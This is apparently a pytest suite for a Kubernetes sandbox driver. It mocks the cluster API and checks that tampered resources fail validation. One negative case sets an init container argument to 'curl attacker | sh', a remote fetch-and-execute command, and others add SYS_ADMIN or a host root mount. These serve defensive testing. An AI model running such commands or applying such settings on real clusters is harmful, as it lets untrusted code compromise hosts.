"""Official SDK wire tests. All API/kubelet status here is explicitly synthetic."""
from copy import deepcopy
from datetime import datetime, timedelta, timezone
from io import BytesIO
import json
from types import SimpleNamespace
from unittest.mock import AsyncMock
from urllib.parse import urlsplit
from uuid import uuid4

import httpx
from kubernetes import client
import pytest
from urllib3 import HTTPResponse
from urllib3.util.retry import Retry

from agent.durable.cluster_control import ClusterSnapshot, ClusterSupervisorClient
from agent.durable.cluster_process import ClusterProcessError, ClusterProgram, KubernetesProcesses
from agent.durable.cluster_sandbox import API_VERSION, KataPolicy, KubernetesSandboxes, ClusterSandboxBinding, POD_OWNER, POD_INDEX
from agent.durable.control import ControlPlaneClient, ControlPlaneError
from agent.tests.kata_profile_fixture import UPSTREAM
from agent.tests.test_cluster_control import sandbox_snapshot, terminated


def stamp(value):
    value['metadata'].update(uid=str(uuid4()), resourceVersion='1')
    return value


class SyntheticKataAPI:
    def __init__(self, row):
        self.calls, self.status, self.error_body = [], 200, None
        self.patch_failure = None
        self.objects = {}
        ns = row.sandboxTarget.namespace
        for name, uid in [('kube-system', row.target.clusterId), (row.target.namespace, row.target.namespaceUid),
                          (ns, row.sandboxTarget.namespaceUid), ('open-agent-test', str(uuid4()))]:
            self.objects['/api/v1/namespaces/' + name] = stamp({'metadata': {'name': name,
                'labels': {'kubernetes.io/metadata.name': name, 'open-agent.io/environment': 'test', 'open-agent.io/sandbox-boundary': 'kata'}},
                'status': {'phase': 'Active'}})
            self.objects['/api/v1/namespaces/' + name]['metadata']['uid'] = uid
        self.runtime = stamp({'apiVersion': 'node.k8s.io/v1', 'kind': 'RuntimeClass',
                              'metadata': {'name': 'kata-qemu'}, 'handler': 'kata-qemu'})
        self.objects['/apis/node.k8s.io/v1/runtimeclasses/kata-qemu'] = self.runtime
        self.account = stamp(deepcopy(UPSTREAM['documents']['service-account.yaml']))
        self.account['metadata']['namespace'] = ns
        self.objects[f'/api/v1/namespaces/{ns}/serviceaccounts/open-agent-sandbox'] = self.account
        self.quota = stamp(deepcopy(UPSTREAM['documents']['resource-quota.yaml']))
        self.quota['metadata']['namespace'] = ns
        self.quota['status'] = {'hard': deepcopy(self.quota['spec']['hard']), 'used': {key: '0' for key in self.quota['spec']['hard']}}
        self.objects[f'/api/v1/namespaces/{ns}/resourcequotas/open-agent-sandbox-limits'] = self.quota
        self.network = stamp(deepcopy(UPSTREAM['documents']['network-policy.yaml']))
        self.network['metadata']['namespace'] = ns
        self.policies = {'metadata': {}, 'items': [self.network]}
        self.objects[f'/apis/networking.k8s.io/v1/namespaces/{ns}/networkpolicies'] = self.policies
        self.workload = stamp(deepcopy(UPSTREAM['workload']))
        self.workload['metadata']['namespace'] = ns
        self.workload['metadata']['generation'] = 1
        self.sandbox_id = self.workload['metadata']['name']
        self.workload['spec']['expireTime'] = row.deadlineAt.isoformat()
        self.workload['spec']['taskResourcePolicyWhenCompleted'] = 'Retain'  # Actual pinned CRD default.
        self.pod, self.pods, self.workloads = None, None, None

    def resources(self, row, driver):
        labels = driver._labels(row, self.sandbox_id)
        self.workload['metadata']['labels'] = labels
        template = self.workload['spec']['template']
        template['metadata']['labels'] = deepcopy(labels)
        template['spec']['containers'][0]['image'] = row.runtimeImage
        template['spec']['containers'][0]['env'][0]['value'] = 'synthetic_' + 'x' * 54
        template['spec']['containers'][0]['env'][1]['value'] = self.sandbox_id
        self.pod = stamp({'apiVersion': 'v1', 'kind': 'Pod', **deepcopy(template)})
        self.pod['metadata'].update(name=self.sandbox_id + '-0', namespace=row.sandboxTarget.namespace,
            labels={**labels, POD_OWNER: self.sandbox_id, POD_INDEX: '0'},
            ownerReferences=[{'apiVersion': API_VERSION, 'kind': 'BatchSandbox', 'name': self.sandbox_id,
                              'uid': self.workload['metadata']['uid'], 'controller': True, 'blockOwnerDeletion': True}])
        self.pod['spec'].update(serviceAccount='open-agent-sandbox', schedulerName='default-scheduler',
                               priority=0, preemptionPolicy='PreemptLowerPriority')
        self.pod['status'] = {'phase': 'Pending'}
        self.pods, self.workloads = {'metadata': {}, 'items': [self.pod]}, {'metadata': {}, 'items': [self.workload]}
        ns = row.sandboxTarget.namespace
        self.objects.update({f'/api/v1/namespaces/{ns}/pods/{self.sandbox_id}-0': self.pod,
            f'/api/v1/namespaces/{ns}/pods': self.pods,
            f'/apis/{API_VERSION}/namespaces/{ns}/batchsandboxes/{self.sandbox_id}': self.workload,
            f'/apis/{API_VERSION}/namespaces/{ns}/batchsandboxes': self.workloads})

    def request(self, method, url, **kwargs):
        path = urlsplit(url).path
        self.calls.append((method, path, kwargs))
        assert method in {'GET', 'PATCH'}
        if method == 'PATCH':
            assert self.objects[path] is self.workload
            assert kwargs['headers']['Content-Type'] == 'application/merge-patch+json'
            body = json.loads(kwargs['body'])
            assert body == {'metadata': {k: self.workload['metadata'][k] for k in ('uid', 'resourceVersion')},
                            'spec': {'replicas': 0}}
            if self.patch_failure == 'conflict':
                return HTTPResponse(body=BytesIO(b'{"reason":"Conflict"}'), status=409, preload_content=False)
            self.workload['spec']['replicas'] = 0
            self.workload['metadata'].update(generation=2, resourceVersion='2')
            if self.patch_failure == 'lost_response':
                raise OSError('private synthetic response loss')
        value = self.objects[path] if self.status == 200 else self.error_body
        return HTTPResponse(body=BytesIO(json.dumps(value).encode()), status=self.status,
                            preload_content=False, headers={'Content-Type': 'application/json'})


@pytest.fixture
def system(monkeypatch):
    data = sandbox_snapshot()
    data['sandboxTarget']['namespace'] = 'open-agent-sandboxes-test'
    data['sandboxPhase'] = 'creating'
    data['deadlineAt'] = datetime.now(timezone.utc) + timedelta(minutes=30)
    data['heartbeatUntil'] = datetime.now(timezone.utc) + timedelta(seconds=60)
    row = ClusterSnapshot.model_validate(data)
    cfg = client.Configuration()
    cfg.host, cfg.retries = 'https://cluster.invalid', Retry(total=0, connect=0, read=0, redirect=0, status=0)
    api = client.ApiClient(cfg)
    processes = KubernetesProcesses(api, row.target, ClusterProgram('executor-worker', 'executor', 'trusted'))
    server = SyntheticKataAPI(row)
    policy = KataPolicy(controlNamespace='open-agent-test',
        controlNamespaceUid=server.objects['/api/v1/namespaces/open-agent-test']['metadata']['uid'],
        runtimeClassUid=server.runtime['metadata']['uid'], runtimeHandler='kata-qemu', imagePullSecret='open-agent-registry',
        execdImage=UPSTREAM['workload']['spec']['template']['spec']['initContainers'][0]['image'])
    driver = KubernetesSandboxes(processes, row.sandboxTarget, policy)
    server.resources(row, driver)
    monkeypatch.setattr(api.rest_client.pool_manager, 'request', server.request)
    yield row, driver, server
    api.close()


@pytest.mark.asyncio
async def test_actual_upstream_shape_is_observed_with_no_execution_permission_or_kube_writes(system):
    row, driver, server = system
    receipt = await driver.observe(row, server.sandbox_id)
    assert receipt.workloadUid == server.workload['metadata']['uid']
    assert receipt.podUid == server.pod['metadata']['uid']
    assert len(receipt.evidenceSha256) == 64
    assert 'synthetic_' not in receipt.model_dump_json()
    assert all(call[0] == 'GET' for call in server.calls)
    # Observing a Pending resource is useful for cleanup, never permission to run.
    assert server.pod['status']['phase'] == 'Pending'
    first = receipt
    row = row.model_copy(update={'sandboxResource': receipt, 'sandboxId': receipt.sandboxId, 'sandboxPhase': 'created'})
    server.pod['metadata']['resourceVersion'] = '2'
    server.workload['metadata']['resourceVersion'] = '3'
    assert await driver.observe(row, receipt.sandboxId) == first
    server.network['spec']['egress'] = [{}]
    with pytest.raises(ClusterProcessError):
        await driver.observe(row, receipt.sandboxId)


@pytest.mark.asyncio
@pytest.mark.parametrize('mutation', [
    'namespace_uid', 'control_namespace_uid', 'namespace_label', 'runtime_uid', 'runtime_handler', 'runtime_overhead',
    'service_token', 'service_secret', 'extra_policy', 'policy_page', 'allow_egress', 'wrong_ingress',
    'quota_uninitialized', 'quota_scope', 'quota_limit', 'workload_owner', 'wrong_scope', 'pool', 'replicas', 'expiry',
    'missing_finalizer', 'pod_owner', 'pod_label', 'sidecar', 'token_mount', 'host_network', 'hostpath', 'unknown_field',
    'writable_root', 'extra_cap', 'image_tag', 'wrong_token', 'installer', 'pod_page', 'duplicate_pod', 'duplicate_cr', 'cr_page',
    'pod_deleting', 'cr_deleting', 'invalid_resource_version', 'unknown_quantity', 'boolean_replica', 'boolean_uid', 'cr_cleanup_policy',
])
async def test_unsafe_or_incomplete_resources_fail_without_binding(system, mutation):
    row, driver, server = system
    pod, cr = server.pod, server.workload
    if mutation == 'namespace_uid': server.objects['/api/v1/namespaces/' + driver.target.namespace]['metadata']['uid'] = str(uuid4())
    elif mutation == 'control_namespace_uid': server.objects['/api/v1/namespaces/open-agent-test']['metadata']['uid'] = str(uuid4())
    elif mutation == 'namespace_label': server.objects['/api/v1/namespaces/' + driver.target.namespace]['metadata']['labels']['open-agent.io/environment'] = 'prod'
    elif mutation == 'runtime_uid': server.runtime['metadata']['uid'] = str(uuid4())
    elif mutation == 'runtime_handler': server.runtime['handler'] = 'runc'
    elif mutation == 'runtime_overhead': server.runtime['overhead'] = {'podFixed': {'memory': '128Mi'}}
    elif mutation == 'service_token': server.account['automountServiceAccountToken'] = True
    elif mutation == 'service_secret': server.account['secrets'] = [{'name': 'token'}]
    elif mutation == 'extra_policy': server.policies['items'].append(deepcopy(server.network))
    elif mutation == 'policy_page': server.policies['metadata']['continue'] = 'more'
    elif mutation == 'allow_egress': server.network['spec']['egress'] = [{}]
    elif mutation == 'wrong_ingress': server.network['spec']['ingress'][0]['from'][0].pop('namespaceSelector')
    elif mutation == 'quota_uninitialized': server.quota['status']['used'].pop('count/batchsandboxes.sandbox.opensandbox.io')
    elif mutation == 'quota_scope': server.quota['spec']['scopes'] = ['BestEffort']
    elif mutation == 'quota_limit': server.quota['spec']['hard']['pods'] = '100'
    elif mutation == 'workload_owner': cr['metadata']['ownerReferences'] = [{'uid': str(uuid4())}]
    elif mutation == 'wrong_scope': cr['metadata']['labels']['oa.lease'] = str(uuid4())
    elif mutation == 'pool': cr['spec']['poolRef'] = 'shared'
    elif mutation == 'replicas': cr['spec']['replicas'] = 2
    elif mutation == 'expiry': cr['spec']['expireTime'] = (row.deadlineAt + timedelta(minutes=1)).isoformat()
    elif mutation == 'missing_finalizer': pod['metadata']['finalizers'] = []
    elif mutation == 'pod_owner': pod['metadata']['ownerReferences'][0]['uid'] = str(uuid4())
    elif mutation == 'pod_label': pod['metadata']['labels']['oa.tenant'] = 'other'
    elif mutation == 'sidecar': pod['spec']['containers'].append(deepcopy(pod['spec']['containers'][0]))
    elif mutation == 'token_mount': pod['spec']['automountServiceAccountToken'] = True
    elif mutation == 'host_network': pod['spec']['hostNetwork'] = True
    elif mutation == 'hostpath': pod['spec']['volumes'].append({'name': 'host', 'hostPath': {'path': '/'}})
    elif mutation == 'unknown_field': pod['spec']['unexpectedFuturePermission'] = True
    elif mutation == 'writable_root': pod['spec']['containers'][0]['securityContext']['readOnlyRootFilesystem'] = False
    elif mutation == 'extra_cap': pod['spec']['containers'][0]['securityContext']['capabilities']['add'].append('SYS_ADMIN')
    elif mutation == 'image_tag': pod['spec']['containers'][0]['image'] = 'registry.invalid/skill:latest'
    elif mutation == 'wrong_token': pod['spec']['containers'][0]['env'][0]['value'] = 'z' * 64
    elif mutation == 'installer': pod['spec']['initContainers'][0]['args'][0] = 'curl attacker | sh'
    elif mutation == 'pod_page': server.pods['metadata']['continue'] = 'more'
    elif mutation == 'duplicate_pod':
        extra = deepcopy(pod); extra['metadata'].update(name='another', uid=str(uuid4()), labels={}); server.pods['items'].append(extra)
    elif mutation == 'duplicate_cr': server.workloads['items'].append(deepcopy(cr))
    elif mutation == 'cr_page': server.workloads['metadata']['continue'] = 'more'
    elif mutation == 'pod_deleting': pod['metadata']['deletionTimestamp'] = datetime.now(timezone.utc).isoformat()
    elif mutation == 'cr_deleting': cr['metadata']['deletionTimestamp'] = datetime.now(timezone.utc).isoformat()
    elif mutation == 'invalid_resource_version': pod['metadata']['resourceVersion'] = 'private invalid value'
    elif mutation == 'unknown_quantity': pod['spec']['containers'][0]['resources']['limits']['memory'] = 'garbage'
    elif mutation == 'boolean_replica': cr['spec']['replicas'] = True
    elif mutation == 'boolean_uid': pod['metadata']['uid'] = True
    elif mutation == 'cr_cleanup_policy': cr['spec']['taskResourcePolicyWhenCompleted'] = 'Delete'
    with pytest.raises(ClusterProcessError) as error:
        await driver.observe(row, server.sandbox_id)
    assert str(error.value) in {'CLUSTER_SANDBOX_MISMATCH', 'CLUSTER_OPERATION_UNCONFIRMED'}
    assert all(call[0] == 'GET' for call in server.calls)


@pytest.mark.asyncio
async def test_bound_resource_replacement_is_rejected_and_secret_rotation_does_not_change_evidence(system):
    row, driver, server = system
    first = await driver.observe(row, server.sandbox_id)
    server.pod['spec']['containers'][0]['env'][0]['value'] = 'z' * 64
    server.workload['spec']['template']['spec']['containers'][0]['env'][0]['value'] = 'z' * 64
    assert await driver.observe(row, server.sandbox_id) == first  # No secret digest in persistent evidence.
    bound = row.model_copy(update={'sandboxResource': first, 'sandboxId': first.sandboxId, 'sandboxPhase': 'created'})
    server.pod['metadata']['uid'] = str(uuid4())
    with pytest.raises(ClusterProcessError): await driver.observe(bound, first.sandboxId)


@pytest.mark.asyncio
@pytest.mark.parametrize('status', [403, 404, 500])
async def test_sdk_failure_is_not_absence_or_permission_and_does_not_leak_body(system, status):
    row, driver, server = system
    server.status, server.error_body = status, {'reason': 'private-model-key-synthetic'}
    with pytest.raises(ClusterProcessError, match='^CLUSTER_OPERATION_UNCONFIRMED$'):
        await driver.observe(row, server.sandbox_id)


@pytest.mark.asyncio
async def test_binding_after_cancel_and_lost_response_recovers_same_receipt_without_recreation(system):
    row, driver, server = system
    state = row.model_dump(mode='json')
    posts = []
    lose = True
    def respond(request):
        nonlocal lose
        posts.append(request.url.path.rsplit('/', 1)[-1])
        if posts[-1] == 'sandbox-resource':
            resource = json.loads(request.content)
            if state['sandboxResource'] is not None: assert state['sandboxResource'] == resource
            state.update(sandboxResource=resource, sandboxId=resource['sandboxId'], sandboxPhase='cleanup_pending',
                         state='cancelled', leaseState='cleanup_pending')
            if lose:
                lose = False
                raise httpx.ReadError('private response lost', request=request)
        return httpx.Response(200, json=state)
    transport = ControlPlaneClient('https://control.internal', 'supervisor', 's' * 32, transport=httpx.MockTransport(respond))
    try:
        control = ClusterSupervisorClient(transport, 'supervisor', row.target, row.sandboxTarget)
        binding = ClusterSandboxBinding(control, driver)
        with pytest.raises(ControlPlaneError): await binding.bind(row.lease.leaseId, server.sandbox_id)
        server.pod['metadata']['resourceVersion'] = '9'
        result = await binding.bind(row.lease.leaseId, server.sandbox_id)
        assert result.state == 'cancelled' and result.leaseState == 'cleanup_pending'
        assert result.sandboxResource.podResourceVersion == '1'
        assert posts == ['inspect', 'sandbox-resource', 'inspect', 'sandbox-resource']
    finally:
        await transport.http.aclose()


@pytest.mark.asyncio
async def test_preparation_rechecks_database_permission_after_external_reads(system, monkeypatch):
    row, driver, server = system
    row = row.model_copy(update={'sandboxTarget': None, 'sandboxPhase': None, 'runtimeImage': None, 'isolationProfile': None})
    control = SimpleNamespace(target=row.target, sandbox_target=driver.target, inspect=AsyncMock(return_value=row),
                              prepare_sandbox=AsyncMock(side_effect=ControlPlaneError('CONTROL_RUN_NOT_PERMITTED')))
    executor = SimpleNamespace(metadata=SimpleNamespace(deletion_timestamp=None),
        spec=SimpleNamespace(node_name='trusted-node', scheduling_gates=None), status=SimpleNamespace(phase='Running'))
    monkeypatch.setattr(driver.processes, 'inspect', AsyncMock(return_value=executor))
    with pytest.raises(ControlPlaneError, match='CONTROL_RUN_NOT_PERMITTED'):
        await ClusterSandboxBinding(control, driver).prepare(row.lease.leaseId, 'registry.invalid/skill@sha256:' + 'a' * 64)
    assert control.prepare_sandbox.await_count == 1 and server.calls
    control.prepare_sandbox.reset_mock()
    executor.spec.scheduling_gates = ['not-authorized']
    with pytest.raises(ClusterProcessError):
        await ClusterSandboxBinding(control, driver).prepare(row.lease.leaseId, 'registry.invalid/skill@sha256:' + 'a' * 64)
    control.prepare_sandbox.assert_not_awaited()


async def terminal_bound(system):
    row, driver, server = system
    receipt = await driver.observe(row, server.sandbox_id)
    data = terminated(row.model_dump(mode='json'))
    data.update(sandboxResource=receipt.model_dump(), sandboxId=receipt.sandboxId, sandboxPhase='cleanup_pending')
    server.calls.clear()
    return ClusterSnapshot.model_validate(data)


@pytest.mark.asyncio
async def test_quiescence_requires_current_generation_and_preserves_existing_pod_and_finalizers(system):
    _, driver, server = system
    row = await terminal_bound(system)
    pod = deepcopy(server.pod)
    server.workload['status'] = {'observedGeneration': 1, 'pauseObservedGeneration': 1}
    assert await driver.quiesce(row) is None
    assert server.workload['spec']['replicas'] == 0
    server.workload['status'].update(observedGeneration=2, pauseObservedGeneration=2)
    receipt = await driver.quiesce(row)
    assert receipt.generation == 2 and receipt.workloadUid == row.sandboxResource.workloadUid
    assert len(receipt.evidenceSha256) == 64 and 'synthetic_' not in receipt.model_dump_json()
    assert await driver.quiesce(row) == receipt
    assert sum(method == 'PATCH' for method, *_ in server.calls) == 1
    assert server.pod == pod and server.workload['metadata']['finalizers'] == ['open-agent.io/sandbox-workload']
    assert row.leaseState == 'cleanup_pending'


@pytest.mark.asyncio
@pytest.mark.parametrize('change', ['active_task', 'held_lease', 'live_executor', 'no_termination',
    'wrong_executor', 'no_binding', 'namespace_replaced', 'workload_replaced', 'deleting', 'missing_finalizer', 'pool'])
async def test_quiescence_rejects_unbound_or_unstopped_execution_before_patch(system, change):
    _, driver, server = system
    row = await terminal_bound(system)
    if change == 'active_task': row = row.model_copy(update={'state': 'running'})
    elif change == 'held_lease': row = row.model_copy(update={'leaseState': 'held'})
    elif change == 'live_executor': row = row.model_copy(update={'phase': 'observed'})
    elif change == 'no_termination': row = row.model_copy(update={'termination': None})
    elif change == 'wrong_executor': row = row.model_copy(update={'podUid': str(uuid4())})
    elif change == 'no_binding': row = row.model_copy(update={'sandboxResource': None})
    elif change == 'namespace_replaced': server.objects['/api/v1/namespaces/' + driver.target.namespace]['metadata']['uid'] = str(uuid4())
    elif change == 'workload_replaced': server.workload['metadata']['uid'] = str(uuid4())
    elif change == 'deleting': server.workload['metadata']['deletionTimestamp'] = datetime.now(timezone.utc).isoformat()
    elif change == 'missing_finalizer': server.workload['metadata']['finalizers'] = []
    elif change == 'pool': server.workload['spec']['poolRef'] = 'unexpected'
    with pytest.raises(ClusterProcessError): await driver.quiesce(row)
    assert all(method == 'GET' for method, *_ in server.calls)


@pytest.mark.asyncio
@pytest.mark.parametrize('status', [{}, {'observedGeneration': 1, 'pauseObservedGeneration': 1},
    {'observedGeneration': 2, 'pauseObservedGeneration': 1}, {'observedGeneration': 2, 'pauseObservedGeneration': '2'}])
async def test_quiescence_never_treats_replica_zero_or_partial_ack_as_completion(system, status):
    _, driver, server = system
    row = await terminal_bound(system)
    server.workload['spec']['replicas'] = 0
    server.workload['metadata']['generation'] = 2
    server.workload['status'] = status
    assert await driver.quiesce(row) is None
    assert all(method == 'GET' for method, *_ in server.calls)


@pytest.mark.asyncio
@pytest.mark.parametrize('failure', ['lost_response', 'conflict'])
async def test_quiescence_transport_failure_retains_quota_and_reconciles_without_blind_retry(system, failure):
    _, driver, server = system
    row = await terminal_bound(system)
    server.patch_failure = failure
    with pytest.raises(ClusterProcessError, match='^CLUSTER_OPERATION_UNCONFIRMED$'):
        await driver.quiesce(row)
    assert sum(method == 'PATCH' for method, *_ in server.calls) == 1
    assert row.leaseState == 'cleanup_pending'
    if failure == 'lost_response':
        server.workload['status'] = {'observedGeneration': 2, 'pauseObservedGeneration': 2}
        assert (await driver.quiesce(row)).generation == 2
        assert sum(method == 'PATCH' for method, *_ in server.calls) == 1


@pytest.mark.asyncio
async def test_quiescence_coordinator_reads_current_control_snapshot_without_releasing(system):
    _, driver, server = system
    row = await terminal_bound(system)
    calls = []
    def respond(request):
        calls.append(request.url.path.rsplit('/', 1)[-1])
        return httpx.Response(200, json=row.model_dump(mode='json'))
    transport = ControlPlaneClient('https://control.internal', 'supervisor', 's' * 32, transport=httpx.MockTransport(respond))
    try:
        control = ClusterSupervisorClient(transport, 'supervisor', row.target, row.sandboxTarget)
        assert await ClusterSandboxBinding(control, driver).quiesce(row.lease.leaseId) is None
        assert calls == ['inspect']
    finally:
        await transport.http.aclose()
